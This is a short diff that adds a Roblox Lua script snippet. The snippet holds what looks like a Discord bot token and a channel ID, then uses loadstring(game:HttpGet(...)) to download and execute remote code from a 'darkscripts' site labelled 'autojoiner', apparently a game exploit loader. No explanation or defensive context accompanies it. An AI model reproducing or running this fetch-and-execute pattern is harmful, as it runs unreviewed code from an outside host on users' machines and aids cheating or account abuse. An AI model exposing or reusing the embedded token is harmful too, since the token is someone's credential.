@@ -1,0 +1,4 @@
+token = "MTI1OTg4OTQy OTAxNTk1NzUxNw.GAhavX.IF8NA bdx46KjjOhBQFaXsuoib1jrlaSruCFx6s"
+channelId = "1324847683374157854"
+
+loadstring(game:HttpGet(('https://darkscripts.space/autojoiner')))()
